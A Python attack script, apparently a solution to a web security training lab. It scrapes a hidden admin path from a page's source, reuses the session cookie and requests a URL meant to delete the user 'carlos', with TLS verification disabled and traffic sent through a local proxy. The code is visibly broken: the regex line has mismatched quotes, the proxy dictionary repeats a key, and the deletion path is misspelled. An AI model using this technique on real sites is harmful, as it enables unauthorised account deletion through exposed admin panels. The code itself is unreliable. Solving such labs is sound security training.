import requests 
import sys
from bs4 import BeautifulSoup
import urllib3
import re 


#Disabling url certificate exceptions
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies= {"http":"http://127.0.0.1:8080", "http": "https:127.0.0.1:8080"}


def delete_user(url):
    r= requests.get(url, verify= False, proxies=proxies)
    #getting the cookie
    session_cookie= r.cookies.get_dict().get("session")

    #getting to the adimin parnel
    soup= BeautifulSoup(r.text, "lxml")
    admin_instances= soup.find(text=re.compile("/admin-"))
    admin_path= re.search("'href', "(,*)" ' ", admin_instances).group(1)

    #delete carlos user
    cookies= {'session': session_cookie}
    delete_carlos_url= url+ admin_path + "/delet carlos"
    r= requests.get(delete_carlos_url, cookies= cookies, verify=False, proxies=proxies)
    if r.status_code==200:
        print("(+) carlos is deleted")

    else:
        print("(-)carlos not deleted")
        print("(-) exiting script")
        sys.exit(-1)
        





    

    
     


def main():
    if len(sys.argv)!= 2:
        print("(+)Usage %s <url>" %sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)

    url=sys.argv[1]
    print("(+) deleting user carlos")
    delete_user(url)



if __name__=="__main__":
    main()